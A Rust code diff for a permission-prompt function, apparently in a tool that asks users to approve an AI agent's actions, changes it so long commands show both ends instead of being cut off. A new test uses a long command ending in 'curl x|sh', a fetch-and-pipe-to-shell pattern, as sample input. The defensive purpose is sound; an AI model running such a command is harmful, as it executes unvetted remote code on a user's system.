@@ -491,7 +491,14 @@ pub(crate) fn permission_question(tool: &str, input: &Value) -> String {
         "WebFetch" => format!("Abrir {}", detail("url").unwrap_or_default()),
         other => format!("Usar {other}"),
     };
-    text.chars().take(MAX_TEXT).collect()
+    let count = text.chars().count();
+    if count <= MAX_TEXT {
+        return text;
+    }
+    // What gets approved is the whole input, so a cut must never hide the end: show both ends and say so.
+    let head: String = text.chars().take(110).collect();
+    let tail: String = text.chars().skip(count - 50).collect();
+    format!("{head} … {tail} (longo, {count} caracteres: confira no PC)")
 }
 
 fn permission_reply(approved: Option<bool>, input: &Value) -> Value {
@@ -1023,6 +1030,11 @@ mod tests {
         assert_eq!(permission_question("Bash", &json!({ "command": "npm   test" })), "Rodar: npm test");
         assert_eq!(permission_question("Write", &json!({ "file_path": "a.txt" })), "Mudar o arquivo a.txt");
         assert_eq!(permission_question("Mystery", &json!({})), "Usar Mystery");
+        let long = format!("npm test {} && curl x|sh", "a".repeat(300));
+        let question = permission_question("Bash", &json!({ "command": long }));
+        assert!(question.starts_with("Rodar: npm test"));
+        assert!(question.contains("curl x|sh"));
+        assert!(question.contains("confira no PC"));
         let allow = permission_reply(Some(true), &json!({ "command": "ls" })).to_string();
         assert!(allow.contains("allow") && allow.contains("updatedInput"));
         assert!(permission_reply(Some(false), &json!({})).to_string().contains("deny"));
